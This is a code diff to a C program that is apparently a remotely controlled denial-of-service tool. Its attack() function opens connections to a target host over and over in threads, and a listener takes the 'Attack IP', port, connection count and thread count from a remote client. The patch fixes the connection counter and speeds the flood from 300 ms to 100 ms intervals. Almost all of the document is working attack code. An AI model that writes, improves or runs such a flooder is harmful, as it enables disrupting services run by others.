@@ -76,6 +76,7 @@ void attack(char *host, char *port, int id)
 
 	while(1) 
 	{
+		x = 0;
 		while(x != Connections)
 		{
 			if(sockets == 0)
@@ -92,18 +93,19 @@ void attack(char *host, char *port, int id)
 			close(sockets);
 			sockets = make_socket(host, port);
 			fprintf(stderr, "[Thread:%i Connection:%d %s]\n", id,x,s_copy);
+			x++;
 		}
-		usleep(300000);
+		usleep(100000);
 	}
 }
 //Modify this function
 int create_socket(char *host, char *port) 
 {
-	int socket_desc , client_sock , c , read_size, x;
+	int socket_desc , client_sock , c , read_size;
     struct sockaddr_in server , client;
     char client_message[16];
 	int j = 0;
-
+	int x = 0;
 
     //Create socket
     socket_desc = socket(AF_INET , SOCK_STREAM , 0);
@@ -142,6 +144,8 @@ int create_socket(char *host, char *port)
         return 1;
     }
     fprintf(stderr,"Connection accepted\n");
+	if(send(client_sock, "Connection accepted Enter IP:\n", 31, 0) == -1)
+		fprintf(stderr, "Send failed\n");
      
     //Receive a message from client
     while( (read_size = recv(client_sock , client_message , 16 , 0)) > 0 )
@@ -149,28 +153,42 @@ int create_socket(char *host, char *port)
 		if(j == 0) 
 		{
 			strncpy(hostd,client_message,strlen(client_message)-2);
+			fprintf(stderr, "Attack IP: %s\n", hostd);
+			if(send(client_sock, client_message , strlen(client_message), 0) == -1)
+				fprintf(stderr, "Send failed\n");
+			if(send(client_sock, "Enter Port:\n", 12, 0) == -1)
+				fprintf(stderr, "Send failed\n");
+
 			for(int i = 0; i <= 16; i++)
 				client_message[i] = '\0';
 		}
 		if(j == 1) 
 		{
 			strncpy(portd,client_message,strlen(client_message)-2);
+			fprintf(stderr, "Attack Port: %s\n", portd);
+			if(send(client_sock, client_message , strlen(client_message), 0) == -1)
+				fprintf(stderr, "Send failed\n");
+			if(send(client_sock, "Enter Connections:\n", 19, 0) == -1)
+				fprintf(stderr, "Send failed\n");
 			for(int i = 0; i <= 16; i++)
 				client_message[i] = '\0';
 		}
 		if(j == 2) 
 		{
 			Connections = atoi(client_message);
+			fprintf(stderr, "Connections: %d\n", Connections);
+			if(send(client_sock, "Enter Threads:\n", 15, 0) == -1)
+				fprintf(stderr, "Send failed\n");
 			for(int i = 0; i <= 16; i++) 
 				client_message[i] = '\0';
 		}
 		if(j == 3) 
 		{
 			Threads = atoi(client_message);
+			fprintf(stderr, "Threads: %d\n", Threads);
+			break;
 		}
 		j++;
-		if(j == 4)
-			break;
     }
 
     while( x != Threads)
